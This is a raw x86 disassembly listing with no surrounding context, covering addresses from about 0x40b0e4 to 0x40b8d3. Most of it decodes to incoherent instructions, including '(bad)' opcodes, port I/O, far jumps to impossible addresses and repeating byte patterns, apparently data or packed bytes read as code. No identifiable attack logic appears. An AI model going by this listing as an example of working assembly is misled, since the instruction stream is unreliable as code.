  40b0e4:	inc    ebx
  40b0e5:	xchg   BYTE PTR ds:0xff1a4078,al
  40b0eb:	mov    esp,0x44869441
  40b0f0:	inc    eax
  40b0f1:	rcl    BYTE PTR [eax*1+0x77356524],0x7a
  40b0f9:	sub    al,0x9e
  40b0fb:	inc    edx
  40b0fc:	adc    cl,BYTE PTR [esi-0x658c5448]
  40b102:	pop    ss
  40b103:	push   ebx
  40b104:	in     al,dx
  40b105:	bound  eax,QWORD PTR [eax+0x5]
  40b108:	inc    ecx
  40b109:	add    BYTE PTR [ebx+0x40],al
  40b10c:	inc    eax
  40b10d:	inc    ecx
  40b10e:	inc    eax
  40b10f:	inc    eax
  40b110:	bound  eax,QWORD PTR ds:0x5624300
  40b116:	add    BYTE PTR [eax+0x40],al
  40b119:	add    BYTE PTR [ecx+0x43],al
  40b11c:	add    BYTE PTR [eax+0x41],al
  40b11f:	add    eax,0x40436200
  40b124:	inc    eax
  40b125:	add    eax,0x77058462
  40b12a:	inc    eax
  40b12b:	pop    esi
  40b12c:	imul   edi,DWORD PTR [eax],0x9b86621e
  40b132:	cmp    al,al
  40b134:	lea    edx,[esp+edi*1+0x76]
  40b138:	xor    dh,BYTE PTR [edi+0x40]
  40b13b:	pusha  
  40b13c:	xchg   edi,eax
  40b13d:	fs dec eax
  40b13f:	cmp    al,0xb7
  40b141:	fisubr WORD PTR [ecx]
  40b143:	call   0xf4e828e
  40b148:	add    eax,0xd3c52a77
  40b14d:	jb     0x40b11a
  40b14f:	in     al,dx
  40b150:	xchg   BYTE PTR [ecx+0x40],al
  40b153:	add    eax,0x41624340
  40b158:	test   BYTE PTR [eax],al
  40b15a:	and    eax,0x404043
  40b15f:	add    BYTE PTR ds:0x626210,al
  40b165:	add    eax,0x43404140
  40b16a:	inc    eax
  40b16b:	inc    ecx
  40b16c:	add    eax,0x10664062
  40b171:	inc    ebx
  40b172:	(bad)  
  40b173:	rol    BYTE PTR [eax+0x42],1
  40b176:	cli    
  40b177:	stos   DWORD PTR es:[edi],eax
  40b178:	mov    ah,0x63
  40b17a:	das    
  40b17b:	inc    eax
  40b17c:	ins    DWORD PTR es:[edi],dx
  40b17d:	rcl    BYTE PTR [eax-0x497ebea0],0x40
  40b184:	push   ds
  40b185:	jle    0x40b1fd
  40b187:	or     BYTE PTR [edx],ch
  40b189:	and    al,0x5
  40b18b:	inc    eax
  40b18c:	inc    eax
  40b18d:	pop    ebp
  40b18e:	inc    ebp
  40b18f:	leave  
  40b190:	aam    0x71
  40b192:	add    eax,0x4041cc
  40b197:	add    BYTE PTR [eax],al
  40b199:	inc    eax
  40b19a:	inc    eax
  40b19b:	inc    ebx
  40b19c:	bound  eax,QWORD PTR [eax]
  40b19e:	inc    eax
  40b19f:	inc    eax
  40b1a0:	add    eax,0x62434162
  40b1a5:	inc    eax
  40b1a6:	js     0x40b1b8
  40b1a8:	inc    ecx
  40b1a9:	add    eax,0x5404325
  40b1ae:	bound  eax,QWORD PTR [eax+0x40]
  40b1b1:	inc    ecx
  40b1b2:	inc    ebx
  40b1b3:	xchg   BYTE PTR [eax],bl
  40b1b5:	add    eax,0xb0b064c0
  40b1ba:	test   al,0x26
  40b1bc:	inc    eax
  40b1bd:	cs jl  0x40b1b4
  40b1c0:	or     eax,0x40b58115
  40b1c5:	jb     0x40b207
  40b1c7:	jecxz  0x40b20d
  40b1c9:	retf   
  40b1ca:	and    eax,0x436241
  40b1cf:	adc    BYTE PTR [eax+0x0],al
  40b1d2:	add    eax,0x62410040
  40b1d7:	inc    eax
  40b1d8:	add    BYTE PTR [ebx-0x34],al
  40b1db:	inc    eax
  40b1dc:	add    eax,0x78434040
  40b1e1:	bound  eax,QWORD PTR [ecx+0x78]
  40b1e4:	add    eax,0x62404043
  40b1e9:	and    eax,0xc340d005
  40b1ee:	out    0x4d,al
  40b1f0:	adc    al,0x68
  40b1f2:	xchg   BYTE PTR [eax+0x26],al
  40b1f5:	cmc    
  40b1f6:	adc    esp,DWORD PTR [ecx+eax*2]
  40b1f9:	jae    0x40b221
  40b1fb:	inc    eax
  40b1fc:	push   ss
  40b1fd:	pop    ecx
  40b1fe:	repz adc ch,BYTE PTR fs:[eax]
  40b202:	mov    ah,0x40
  40b204:	inc    eax
  40b205:	rcl    bl,0x11
  40b208:	sub    BYTE PTR [ecx+0x4a7b7205],bh
  40b20e:	jo     0x40b1d9
  40b210:	inc    esp
  40b211:	in     al,dx
  40b212:	xchg   BYTE PTR [ebp-0x4375bfbe],dl
  40b218:	and    al,0x90
  40b21a:	sub    al,0x40
  40b21c:	inc    esp
  40b21d:	dec    ebp
  40b21e:	cli    
  40b21f:	inc    ecx
  40b220:	inc    eax
  40b221:	add    eax,0x43436240
  40b226:	add    eax,0x62004040
  40b22b:	inc    eax
  40b22c:	add    BYTE PTR [ecx+0x40],al
  40b22f:	inc    ebx
  40b230:	test   BYTE PTR ds:0x58054041,ah
  40b236:	inc    eax
  40b237:	inc    eax
  40b238:	bound  eax,QWORD PTR [eax+0x66]
  40b23b:	inc    ecx
  40b23c:	inc    eax
  40b23d:	add    eax,0x5d71500
  40b242:	mov    bl,0x40
  40b244:	jo     0x40b286
  40b246:	add    BYTE PTR [edx+0x58],0x87
  40b24a:	add    eax,0xca7e4240
  40b24f:	pop    ebx
  40b250:	adc    dl,BYTE PTR [eax-0x7ebfb37a]
  40b256:	std    
  40b257:	sub    dl,ch
  40b259:	inc    ecx
  40b25a:	das    
  40b25b:	inc    eax
  40b25c:	adc    eax,0x4154fdc0
  40b261:	xor    dh,BYTE PTR [edx-0x4d8487c0]
  40b267:	arpl   WORD PTR [eax+0x40430000],ax
  40b26d:	bound  eax,QWORD PTR ds:0x25404110
  40b273:	add    ah,cl
  40b275:	inc    ebx
  40b276:	add    eax,0x40402562
  40b27b:	add    BYTE PTR [eax+0x40],al
  40b27e:	inc    ecx
  40b27f:	inc    ecx
  40b280:	add    eax,0x78434025
  40b285:	bound  eax,QWORD PTR [eax-0x7c]
  40b288:	inc    eax
  40b289:	inc    ecx
  40b28a:	push   esp
  40b28b:	add    eax,0x5cc24030
  40b290:	fld    st(3)
  40b292:	arpl   WORD PTR [esi+0x70416340],ax
  40b298:	dec    eax
  40b299:	cwde   
  40b29a:	jle    0x40b2c0
  40b29c:	inc    eax
  40b29d:	inc    eax
  40b29e:	(bad)
  40b2a1:	add    eax,0x7a40b12c
  40b2a6:	fnstsw WORD PTR [edi+0x5cecb42]
  40b2ac:	jae    0x40b278
  40b2ae:	rol    BYTE PTR [ecx+0x40],0x40
  40b2b2:	inc    ebx
  40b2b3:	int3   
  40b2b4:	add    BYTE PTR ds:0x56240,al
  40b2ba:	inc    ebx
  40b2bb:	inc    eax
  40b2bc:	inc    eax
  40b2bd:	add    BYTE PTR [ecx+0x62],al
  40b2c0:	bound  eax,QWORD PTR [eax]
  40b2c2:	int3   
  40b2c3:	inc    eax
  40b2c4:	inc    ebx
  40b2c5:	add    eax,0x43624041
  40b2ca:	adc    BYTE PTR [ecx+0x5],al
  40b2cd:	inc    eax
  40b2ce:	test   eax,0x86af983c
  40b2d3:	mov    ecx,0x25070240
  40b2d8:	adc    eax,0x2f712171
  40b2dd:	or     edx,esi
  40b2df:	test   al,0xc9
  40b2e1:	into   
  40b2e2:	mov    al,0xf0
  40b2e4:	push   esi
  40b2e5:	ror    DWORD PTR [edi+0x10404362],0x5
  40b2ec:	inc    eax
  40b2ed:	int3   
  40b2ee:	pop    eax
  40b2ef:	inc    ecx
  40b2f0:	inc    ebx
  40b2f1:	bound  eax,QWORD PTR [ecx+0x40]
  40b2f4:	add    eax,0x4140
  40b2f9:	and    eax,0x40400062
  40b2fe:	add    eax,0x84404340
  40b303:	int3   
  40b304:	js     0x40b306
  40b306:	inc    ecx
  40b307:	adc    BYTE PTR [edx+0xf],ah
  40b30a:	adc    ch,BYTE PTR [eax+0x40710562]
  40b310:	dec    eax
  40b311:	aas    
  40b312:	mov    esp,0x5e86b815
  40b317:	inc    ebp
  40b318:	rcr    DWORD PTR [esi+0x40624341],0x70
  40b31f:	das    
  40b320:	pop    edi
  40b321:	sti    
  40b322:	ins    DWORD PTR es:[edi],dx
  40b323:	mov    al,0xf5
  40b325:	scas   eax,DWORD PTR es:[edi]
  40b326:	rol    BYTE PTR [eax-0x3e],1
  40b329:	fisubr WORD PTR [edx+ecx*2+0x2370059c]
  40b330:	and    eax,DWORD PTR [ebp-0x799ddd9e]
  40b336:	dec    esi
  40b337:	push   0x65
  40b339:	jmp    0x2d838386
  40b33e:	add    BYTE PTR [eax+0x41],al
  40b341:	inc    eax
  40b342:	inc    ebx
  40b343:	bound  ax,DWORD PTR ds:0x40434100
  40b34a:	add    eax,0x40054062
  40b34f:	bound  eax,QWORD PTR [ecx+0x40]
  40b352:	inc    ebx
  40b353:	inc    eax
  40b354:	add    eax,0x25405841
  40b359:	bound  eax,QWORD PTR [eax+0x43]
  40b35c:	inc    eax
  40b35d:	adc    BYTE PTR [eax+0x42],al
  40b360:	aam    0xfc
  40b362:	call   0x40eee3a1
  40b367:	and    eax,0x242fee9d
  40b36c:	inc    ecx
  40b36d:	add    eax,0x13757240
  40b372:	int3   
  40b373:	inc    edx
  40b374:	test   al,0x86
  40b376:	push   esp
  40b377:	inc    eax
  40b378:	or     DWORD PTR [edi-0x30],esi
  40b37b:	sub    al,0x12
  40b37d:	das    
  40b37e:	inc    eax
  40b37f:	cmp    ecx,ecx
  40b381:	inc    eax
  40b382:	inc    ecx
  40b383:	inc    ebx
  40b384:	inc    eax
  40b385:	add    eax,0x43406262
  40b38a:	inc    ecx
  40b38b:	adc    BYTE PTR [eax],al
  40b38d:	inc    eax
  40b38e:	add    eax,0x43000562
  40b393:	add    BYTE PTR [ecx+0x40],al
  40b396:	inc    eax
  40b397:	add    eax,0x400062
  40b39c:	inc    ebx
  40b39d:	inc    eax
  40b39e:	js     0x40b3e1
  40b3a0:	inc    ecx
  40b3a1:	bound  eax,QWORD PTR [eax-0x68]
  40b3a4:	inc    edx
  40b3a5:	popf   
  40b3a6:	test   al,0xad
  40b3a8:	inc    eax
  40b3a9:	push   edx
  40b3aa:	push   ebx
  40b3ab:	jnp    0x40b3e2
  40b3ad:	jp     0x40b3c4
  40b3af:	add    eax,0xb0d04020
  40b3b4:	cmp    eax,0x40864261
  40b3b9:	push   ebp
  40b3ba:	and    al,0x0
  40b3bc:	test   al,0x2a
  40b3be:	jb     0x40b3e3
  40b3c0:	jg     0x40b3f5
  40b3c2:	and    BYTE PTR [edi-0x533382ef],bl
  40b3c8:	retf   0x4062
  40b3cb:	add    eax,0x40430041
  40b3d0:	inc    eax
  40b3d1:	inc    ecx
  40b3d2:	inc    eax
  40b3d3:	inc    eax
  40b3d4:	bound  eax,QWORD PTR ds:0x5624300
  40b3da:	add    BYTE PTR [eax+0x40],al
  40b3dd:	add    BYTE PTR [ecx+0x43],al
  40b3e0:	add    BYTE PTR [eax+0x41],al
  40b3e3:	add    eax,0x40436200
  40b3e8:	inc    eax
  40b3e9:	add    eax,0x4bc26a62
  40b3ee:	mov    esp,0x7f056234
  40b3f3:	inc    eax
  40b3f4:	das    
  40b3f5:	es or  eax,0x4a862adf
  40b3fb:	bound  eax,QWORD PTR [ebp-0x67]
  40b3fe:	inc    edx
  40b3ff:	inc    ebx
  40b400:	outs   dx,BYTE PTR es:[esi]
  40b402:	inc    eax
  40b403:	push   ss
  40b404:	rcl    BYTE PTR [esi-0x541ec6dc],0x40
  40b40b:	inc    eax
  40b40c:	jp     0x40b44f
  40b40e:	inc    eax
  40b40f:	add    eax,0x41624340
  40b414:	test   BYTE PTR [eax],al
  40b416:	and    eax,0x404043
  40b41b:	add    BYTE PTR ds:0x626210,al
  40b421:	add    eax,0x43404140
  40b426:	inc    eax
  40b427:	inc    ecx
  40b428:	add    eax,0x10664062
  40b42d:	inc    ebx
  40b42e:	bound  ebx,QWORD PTR [edx]
  40b430:	ror    BYTE PTR [eax+0x54],1
  40b433:	add    eax,0x9c2a3440
  40b438:	bound  eax,QWORD PTR [ebx+0x42]
  40b43b:	xchg   BYTE PTR [eax+eax*2-0x3c],cl
  40b43f:	out    dx,al
  40b440:	xor    BYTE PTR [ecx],bh
  40b442:	shl    BYTE PTR [ecx],1
  40b444:	inc    eax
  40b445:	(bad)  
  40b447:	xchg   ecx,eax
  40b448:	sub    BYTE PTR [esi+0x4040aa56],bh
  40b44e:	xor    ebp,DWORD PTR [edx]
  40b450:	inc    eax
  40b451:	sahf   
  40b452:	sub    eax,DWORD PTR ds:0xac01010
  40b458:	adc    ch,BYTE PTR [eax+0x41cc05d1]
  40b45e:	inc    eax
  40b45f:	add    BYTE PTR [eax],al
  40b461:	add    BYTE PTR [eax+0x40],al
  40b464:	inc    ebx
  40b465:	bound  eax,QWORD PTR [eax]
  40b467:	inc    eax
  40b468:	inc    eax
  40b469:	add    eax,0x62434162
  40b46e:	inc    eax
  40b46f:	js     0x40b481
  40b471:	inc    ecx
  40b472:	add    eax,0x5404325
  40b477:	bound  eax,QWORD PTR [eax+0x40]
  40b47a:	inc    ecx
  40b47b:	inc    ebx
  40b47c:	xchg   BYTE PTR [eax+0x7d],al
  40b47f:	xor    al,0x7e
  40b481:	imul   edx,DWORD PTR [eax],0x447c3579
  40b487:	and    ebp,DWORD PTR [esi]
  40b489:	shl    DWORD PTR [esp+ebp*2-0x3ebf7957],cl
  40b490:	aaa    
  40b491:	test   al,0x5
  40b493:	bound  eax,QWORD PTR ds:0x9b42337c
  40b499:	adc    cl,bl
  40b49b:	and    al,0x86
  40b49d:	cmc    
  40b49e:	and    eax,0x436241
  40b4a3:	adc    BYTE PTR [eax+0x0],al
  40b4a6:	add    eax,0x62410040
  40b4ab:	inc    eax
  40b4ac:	add    BYTE PTR [ebx-0x34],al
  40b4af:	inc    eax
  40b4b0:	add    eax,0x78434040
  40b4b5:	bound  eax,QWORD PTR [ecx+0x78]
  40b4b8:	add    eax,0x62404043
  40b4bd:	inc    eax
  40b4be:	ror    BYTE PTR [ecx],0xbc
  40b4c1:	adc    bl,ah
  40b4c3:	ss jl  0x40b4e7
  40b4c6:	and    eax,0x63ac4129
  40b4cb:	test   al,0xe4
  40b4cd:	inc    eax
  40b4ce:	dec    ebp
  40b4cf:	pop    es
  40b4d0:	pop    es
  40b4d1:	adc    eax,0x2c7c055c
  40b4d6:	inc    ecx
  40b4d7:	inc    eax
  40b4d8:	add    eax,0x43436240
  40b4dd:	add    eax,0x62004040
  40b4e2:	inc    eax
  40b4e3:	add    BYTE PTR [ecx+0x40],al
  40b4e6:	inc    ebx
  40b4e7:	test   BYTE PTR ds:0x58054041,ah
  40b4ed:	inc    eax
  40b4ee:	inc    eax
  40b4ef:	bound  eax,QWORD PTR [eax+0x66]
  40b4f2:	inc    ecx
  40b4f3:	inc    eax
  40b4f4:	add    eax,0xdc000
  40b4f9:	inc    edi
  40b4fa:	das    
  40b4fb:	xchg   ch,al
  40b4fd:	inc    eax
  40b4fe:	xor    dl,BYTE PTR [eax+0x352d4e62]
  40b504:	jl     0x40b506
  40b506:	call   0x3ca7:0xcf309620
  40b50d:	and    ebx,DWORD PTR [esi+edx*2+0x2c]
  40b511:	imul   ebp,DWORD PTR [ebx+0x5],0x4300007c
  40b518:	inc    eax
  40b519:	bound  eax,QWORD PTR ds:0x25404110
  40b51f:	add    ah,cl
  40b521:	inc    ebx
  40b522:	add    eax,0x40402562
  40b527:	add    BYTE PTR [eax+0x40],al
  40b52a:	inc    ecx
  40b52b:	inc    ecx
  40b52c:	add    eax,0x78434025
  40b531:	bound  eax,QWORD PTR [eax-0x7c]
  40b534:	inc    eax
  40b535:	inc    ecx
  40b536:	shl    BYTE PTR fs:[edi-0x79577c99],0x33
  40b53e:	inc    eax
  40b53f:	and    ah,bh
  40b541:	inc    edx
  40b542:	les    edx,FWORD PTR [edx]
  40b544:	sub    al,0x7c
  40b546:	ss jg  0x40b570
  40b549:	cmp    al,0x4f
  40b54b:	arpl   WORD PTR [ecx+0x40],ax
  40b54e:	inc    eax
  40b54f:	inc    ebx
  40b550:	int3   
  40b551:	add    BYTE PTR ds:0x56240,al
  40b557:	inc    ebx
  40b558:	inc    eax
  40b559:	inc    eax
  40b55a:	add    BYTE PTR [ecx+0x62],al
  40b55d:	bound  eax,QWORD PTR [eax]
  40b55f:	int3   
  40b560:	inc    eax
  40b561:	inc    ebx
  40b562:	add    eax,0x43624041
  40b567:	adc    BYTE PTR [ecx+0x5],al
  40b56a:	inc    eax
  40b56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b56c:	and    DWORD PTR [eax-0x34],eax
  40b56f:	callw  0x18f3
  40b573:	add    eax,0x2127297c
  40b578:	test   al,0xc5
  40b57a:	call   0x2380c105
  40b57f:	jns    0x40b530
  40b581:	push   eax
  40b582:	adc    eax,0x41247c32
  40b587:	inc    ebx
  40b588:	cmp    al,BYTE PTR [ebx-0x33]
  40b58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b58c:	jp     0x40b526
  40b58e:	inc    ecx
  40b58f:	repz inc edi
  40b591:	bound  esi,QWORD PTR [edi]
  40b593:	bound  eax,QWORD PTR [ebx+0x40]
  40b596:	adc    BYTE PTR ds:0x4158cc40,al
  40b59c:	inc    ebx
  40b59d:	bound  eax,QWORD PTR [ecx+0x40]
  40b5a0:	add    eax,0x4140
  40b5a5:	and    eax,0x40400062
  40b5aa:	add    eax,0x84404340
  40b5af:	int3   
  40b5b0:	js     0x40b5b2
  40b5b2:	inc    ecx
  40b5b3:	adc    BYTE PTR [edx+0xf],ah
  40b5b6:	add    eax,0x82404b7c
  40b5bb:	pushf  
  40b5bc:	sub    BYTE PTR [edi],al
  40b5be:	xchg   BYTE PTR [ecx+eax*1+0x24],dh
  40b5c2:	push   cs
  40b5c3:	xchg   edx,eax
  40b5c4:	stos   DWORD PTR es:[edi],eax
  40b5c5:	bound  esp,QWORD PTR ds:0x4467787b
  40b5cb:	sub    DWORD PTR [ebp-0x3c],edi
  40b5ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5cf:	mov    ah,0x46
  40b5d1:	inc    eax
  40b5d2:	ret    
  40b5d3:	aad    0x16
  40b5d5:	dec    edi
  40b5d6:	add    eax,0x4140007b
  40b5db:	inc    eax
  40b5dc:	inc    ebx
  40b5dd:	bound  ax,DWORD PTR ds:0x40434100
  40b5e4:	add    eax,0x40054062
  40b5e9:	bound  eax,QWORD PTR [ecx+0x40]
  40b5ec:	inc    ebx
  40b5ed:	inc    eax
  40b5ee:	add    eax,0x25405841
  40b5f3:	bound  eax,QWORD PTR [eax+0x43]
  40b5f6:	inc    eax
  40b5f7:	adc    BYTE PTR [esi-0x13],bh
  40b5fa:	adc    al,0x60
  40b5fc:	into   
  40b5fd:	add    BYTE PTR [esi-0x68cfbf6c],al
  40b603:	test   BYTE PTR [eax+0x6],cl
  40b606:	sub    al,0x7b
  40b608:	xor    ah,BYTE PTR [edi+0x4d]
  40b60b:	bound  eax,QWORD PTR ds:0x40f0a365
  40b611:	inc    ecx
  40b612:	xchg   edx,eax
  40b613:	dec    ebp
  40b614:	inc    eax
  40b615:	inc    ecx
  40b616:	inc    ebx
  40b617:	inc    eax
  40b618:	add    eax,0x43406262
  40b61d:	inc    ecx
  40b61e:	adc    BYTE PTR [eax],al
  40b620:	inc    eax
  40b621:	add    eax,0x43000562
  40b626:	add    BYTE PTR [ecx+0x40],al
  40b629:	inc    eax
  40b62a:	add    eax,0x400062
  40b62f:	inc    ebx
  40b630:	inc    eax
  40b631:	js     0x40b674
  40b633:	inc    ecx
  40b634:	bound  eax,QWORD PTR [eax-0x35]
  40b637:	rol    BYTE PTR ds:0xae43227b,cl
  40b63d:	xor    BYTE PTR [esp+ebx*8+0x46402c86],0xe0
  40b645:	xor    edx,DWORD PTR ds:0x7c79349d
  40b64b:	je     0x40b697
  40b64d:	inc    edx
  40b64e:	retf   
  40b64f:	clc    
  40b650:	mov    ds:0x41054062,al
  40b655:	add    BYTE PTR [ebx+0x40],al
  40b658:	inc    eax
  40b659:	inc    ecx
  40b65a:	inc    eax
  40b65b:	inc    eax
  40b65c:	bound  eax,QWORD PTR ds:0x5624300
  40b662:	add    BYTE PTR [eax+0x40],al
  40b665:	add    BYTE PTR [ecx+0x43],al
  40b668:	add    BYTE PTR [eax+0x41],al
  40b66b:	add    eax,0x40436200
  40b670:	inc    eax
  40b671:	add    eax,0x40c04462
  40b676:	mov    ds:0x5a86564,al
  40b67b:	js     0x40b6cd
  40b67d:	push   es
  40b67e:	cmp    BYTE PTR [edx+ebp*1+0x44d98610],dl
  40b685:	inc    eax
  40b686:	push   esi
  40b687:	inc    ecx
  40b688:	inc    eax
  40b689:	add    eax,0x41624340
  40b68e:	test   BYTE PTR [eax],al
  40b690:	and    eax,0x404043
  40b695:	add    BYTE PTR ds:0x626210,al
  40b69b:	add    eax,0x43404140
  40b6a0:	inc    eax
  40b6a1:	inc    ecx
  40b6a2:	add    eax,0x10664062
  40b6a7:	inc    ebx
  40b6a8:	bound  eax,QWORD PTR ds:0x78295211
  40b6ae:	pusha  
  40b6af:	arpl   WORD PTR [ecx*8+0x3ca180a4],bp
  40b6b6:	inc    eax
  40b6b7:	and    BYTE PTR [edi+0x5c30dbb],cl
  40b6bd:	jae    0x40b709
  40b6bf:	arpl   WORD PTR ds:0x8644cdeb,ax
  40b6c5:	push   ebx
  40b6c6:	inc    eax
  40b6c7:	inc    eax
  40b6c8:	and    DWORD PTR [edx+0x10],esp
  40b6cb:	stc    
  40b6cc:	daa    
  40b6cd:	inc    eax
  40b6ce:	dec    ebp
  40b6cf:	and    al,0x2b
  40b6d1:	lods   al,BYTE PTR ds:[esi]
  40b6d2:	mov    al,0xc4
  40b6d4:	mov    al,ds:0xbf014040
  40b6d9:	adc    eax,0x4041cc05
  40b6de:	add    BYTE PTR [eax],al
  40b6e0:	add    BYTE PTR [eax+0x40],al
  40b6e3:	inc    ebx
  40b6e4:	bound  eax,QWORD PTR [eax]
  40b6e6:	inc    eax
  40b6e7:	inc    eax
  40b6e8:	add    eax,0x62434162
  40b6ed:	inc    eax
  40b6ee:	js     0x40b700
  40b6f0:	inc    ecx
  40b6f1:	add    eax,0x5404325
  40b6f6:	bound  eax,QWORD PTR [eax+0x40]
  40b6f9:	inc    ecx
  40b6fa:	inc    ebx
  40b6fb:	add    eax,0x7e400561
  40b700:	inc    eax
  40b701:	xchg   ebx,eax
  40b702:	retf   
  40b703:	dec    esp
  40b704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b705:	xchg   BYTE PTR [eax+eax*8+0x35],ch
  40b709:	mov    eax,0x405e2789
  40b70e:	inc    eax
  40b70f:	cmc    
  40b710:	and    eax,0x436241
  40b715:	adc    BYTE PTR [eax+0x0],al
  40b718:	add    eax,0x62410040
  40b71d:	inc    eax
  40b71e:	add    BYTE PTR [ebx-0x34],al
  40b721:	inc    eax
  40b722:	add    eax,0x78434040
  40b727:	bound  eax,QWORD PTR [ecx+0x78]
  40b72a:	add    eax,0x62404043
  40b72f:	ja     0x40b753
  40b731:	jae    0x40b727
  40b733:	ret    0x40f4
  40b736:	dec    edi
  40b737:	inc    eax
  40b738:	out    dx,al
  40b739:	dec    esp
  40b73a:	inc    esi
  40b73b:	mov    WORD PTR ds:0x29326d00,es
  40b741:	add    dl,BYTE PTR [edi+ebx*1-0x7a]
  40b745:	inc    eax
  40b746:	adc    eax,0x40054041
  40b74b:	bound  eax,QWORD PTR [ebx+0x43]
  40b74e:	add    eax,0x62004040
  40b753:	inc    eax
  40b754:	add    BYTE PTR [ecx+0x40],al
  40b757:	inc    ebx
  40b758:	test   BYTE PTR ds:0x58054041,ah
  40b75e:	inc    eax
  40b75f:	inc    eax
  40b760:	bound  eax,QWORD PTR [eax+0x66]
  40b763:	inc    ecx
  40b764:	inc    eax
  40b765:	add    eax,0x44cf7d00
  40b76a:	addr16 mov ebp,0x407a7e2d
  40b770:	and    eax,0xf3636e22
  40b775:	test   eax,0x5cde2b3f
  40b77a:	and    BYTE PTR [edx-0x15af81fb],cl
  40b780:	mov    edi,0x8615a462
  40b785:	not    ebx
  40b787:	add    BYTE PTR [eax],al
  40b789:	inc    ebx
  40b78a:	inc    eax
  40b78b:	bound  eax,QWORD PTR ds:0x25404110
  40b791:	add    ah,cl
  40b793:	inc    ebx
  40b794:	add    eax,0x40402562
  40b799:	add    BYTE PTR [eax+0x40],al
  40b79c:	inc    ecx
  40b79d:	inc    ecx
  40b79e:	add    eax,0x78434025
  40b7a3:	bound  eax,QWORD PTR [eax-0x7c]
  40b7a6:	inc    eax
  40b7a7:	inc    ecx
  40b7a8:	inc    eax
  40b7a9:	push   ecx
  40b7aa:	adc    eax,DWORD PTR ds:0xc37d2f53
  40b7b0:	and    eax,DWORD PTR [ecx+0x4c]
  40b7b3:	xchg   edx,esp
  40b7b5:	repnz pop edx
  40b7b7:	jae    0x40b834
  40b7b9:	dec    ebx
  40b7ba:	bound  eax,QWORD PTR [edx+edi*8+0x5]
  40b7be:	jb     0x40b801
  40b7c0:	inc    eax
  40b7c1:	sbb    al,0x41
  40b7c3:	inc    eax
  40b7c4:	inc    eax
  40b7c5:	inc    ebx
  40b7c6:	int3   
  40b7c7:	add    BYTE PTR ds:0x56240,al
  40b7cd:	inc    ebx
  40b7ce:	inc    eax
  40b7cf:	inc    eax
  40b7d0:	add    BYTE PTR [ecx+0x62],al
  40b7d3:	bound  eax,QWORD PTR [eax]
  40b7d5:	int3   
  40b7d6:	inc    eax
  40b7d7:	inc    ebx
  40b7d8:	add    eax,0x43624041
  40b7dd:	adc    BYTE PTR [ecx+0x5],al
  40b7e0:	inc    eax
  40b7e1:	sbb    eax,0x5d868803
  40b7e6:	push   ecx
  40b7e7:	and    ah,BYTE PTR [esi]
  40b7e9:	mov    al,0x6a
  40b7eb:	sbb    al,0x23
  40b7ed:	jno    0x40b837
  40b7ef:	pop    ecx
  40b7f0:	inc    esi
  40b7f1:	xor    DWORD PTR [bp+si-0xf],esp
  40b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7f6:	aaa    
  40b7f7:	inc    edi
  40b7f8:	jnp    0x40b842
  40b7fa:	and    al,0x56
  40b7fc:	add    eax,0x8a577f70
  40b801:	inc    ebx
  40b802:	inc    ecx
  40b803:	int3   
  40b804:	int3   
  40b805:	int3   
  40b806:	int3   
  40b807:	int3   
  40b808:	int3   
  40b809:	int3   
  40b80a:	int3   
  40b80b:	int3   
  40b80c:	int3   
  40b80d:	int3   
  40b80e:	int3   
  40b80f:	int3   
  40b810:	mov    al,BYTE PTR [edi]
  40b812:	mov    cl,BYTE PTR [esi]
  40b814:	ret    
  40b815:	int3   
  40b816:	int3   
  40b817:	int3   
  40b818:	int3   
  40b819:	int3   
  40b81a:	int3   
  40b81b:	int3   
  40b81c:	int3   
  40b81d:	int3   
  40b81e:	int3   
  40b81f:	int3   
  40b820:	push   esi
  40b821:	push   ecx
  40b822:	mov    esi,edi
  40b824:	mov    BYTE PTR [esi],al
  40b826:	pop    ecx
  40b827:	pop    esi
  40b828:	inc    esi
  40b829:	ret    
  40b82a:	int3   
  40b82b:	int3   
  40b82c:	int3   
  40b82d:	int3   
  40b82e:	int3   
  40b82f:	int3   
  40b830:	stos   BYTE PTR es:[edi],al
  40b831:	xchg   BYTE PTR [ebx+0x10416326],ch
  40b837:	aaa    
  40b838:	cmp    DWORD PTR [eax],ebp
  40b83a:	mov    eax,0x404a5963
  40b83f:	inc    edx
  40b840:	inc    eax
  40b841:	inc    ecx
  40b842:	inc    ebx
  40b843:	inc    eax
  40b844:	add    eax,0x43406262
  40b849:	inc    ecx
  40b84a:	adc    BYTE PTR [eax],al
  40b84c:	inc    eax
  40b84d:	add    eax,0x43000562
  40b852:	add    BYTE PTR [ecx+0x40],al
  40b855:	inc    eax
  40b856:	add    eax,0x400062
  40b85b:	inc    ebx
  40b85c:	inc    eax
  40b85d:	js     0x40b8a0
  40b85f:	inc    ecx
  40b860:	bound  eax,QWORD PTR [eax-0x33]
  40b863:	test   eax,0x38404b05
  40b868:	sbb    DWORD PTR [edi],edi
  40b86a:	pop    eax
  40b86b:	add    eax,0x78ad90cb
  40b870:	inc    eax
  40b871:	rcl    BYTE PTR [ecx+0x67fe4586],1
  40b877:	inc    eax
  40b878:	adc    dh,BYTE PTR [ecx+0x6a]
  40b87b:	adc    ebp,DWORD PTR [ebx+0x403157b8]
  40b881:	jecxz  0x40b8f8
  40b883:	test   al,0xb4
  40b885:	test   al,0x34
  40b887:	ins    BYTE PTR es:[edi],dx
  40b888:	add    edx,DWORD PTR [ecx+eiz*4-0x8edf2fb]
  40b88f:	xchg   esi,eax
  40b890:	inc    eax
  40b891:	jp     0x40b82a
  40b893:	xchg   cl,cl
  40b895:	bound  eax,QWORD PTR [eax+0x5]
  40b898:	inc    ecx
  40b899:	add    BYTE PTR [ebx+0x40],al
  40b89c:	inc    eax
  40b89d:	inc    ecx
  40b89e:	inc    eax
  40b89f:	inc    eax
  40b8a0:	bound  eax,QWORD PTR ds:0x5624300
  40b8a6:	add    BYTE PTR [eax+0x40],al
  40b8a9:	add    BYTE PTR [ecx+0x43],al
  40b8ac:	add    BYTE PTR [eax+0x41],al
  40b8af:	add    eax,0x40436200
  40b8b4:	inc    eax
  40b8b5:	add    eax,0x43944162
  40b8ba:	add    eax,0xa4604f47
  40b8bf:	sub    BYTE PTR [eax+0x513740d1],0xa7
  40b8c6:	or     eax,0x4d5e8c3
  40b8cb:	sbb    eax,0x48cd0516
  40b8d0:	jecxz  0x40b8a1
  40b8d2:	inc    eax
  40b8d3:	add    edx,DWORD PTR [ecx]
